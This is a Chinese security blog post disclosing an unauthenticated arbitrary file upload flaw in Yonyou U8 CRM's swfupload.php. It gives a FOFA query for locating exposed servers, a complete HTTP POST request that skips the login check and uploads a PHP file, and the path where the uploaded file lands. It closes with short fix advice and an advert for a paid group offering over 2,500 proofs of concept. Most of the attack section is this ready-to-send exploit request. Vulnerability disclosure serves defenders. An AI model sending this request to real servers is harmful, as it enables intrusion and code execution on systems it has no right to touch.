#  用友U8 crm客户关系管理swfupload.php存在任意文件上传漏洞  
原创 北雪网络安全
                    北雪网络安全  北雪网络安全   2026-10-07 02:12  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
FOFA  
：  
body="  
用友  
U8CRM"  
  
  
03  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziabbm5thlVliakdDO73P2wmwIpia5zsIpRD5exQXa5xFBFK50BiaHUeibQ6hSv0HHrDPiadX3uvNezficTluAJy1mgbRevDIbMewG72I/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaalJ97yanDjDgUdnh9htzibgdq9M7Dj9ClL13aoM6EGyXqAyohjxUswq9LRDHEgXA0s3AqEKbhGsUWfwRd023kSacfw3mqJbBA/640?wx_fmt=png&from=appmsg "")  
  
```
POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data;
boundary=---------------------------269520967239406871642430066855
Content-Length: 389

-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream

<?phpinfo();sleep(8);unlink(__FILE__);?>
-----------------------------269520967239406871642430066855
Content-Disposition:
form-data; name="upload"

upload
-----------------------------269520967239406871642430066855--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjRzUzPYw3xDGuCImuYiasKvPiaRibVngibdgpZocPCOrOISPOjRuY9RGYggz3aBHO30SMUX37U4bSmwmCGMX31ZNCYV879XAwPDMg/640?wx_fmt=png&from=appmsg "")  
```
文件路径：http://127.0.0.1/tmpfile/{{path}}.tmp.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgp60AS8sLSgH8utSmbmadibnVg71icH6WID6MtmLlaG7A9EzJ5AwFR6ewOTGkUREqsrZD1ln47LiaNbAhniaCn32iafe3MkFCR6SG4/640?wx_fmt=png&from=appmsg "")  
  
  
      
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziapVmibQ9wGT47yJHEoGHZPqbibEicWa3wZmUxHRfVla80eQ8AgaftJhHFb1BRicsqY0fLCmQo3qku9yg8Uo0oWkv82BMicFaZz51kM/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
  
  
  
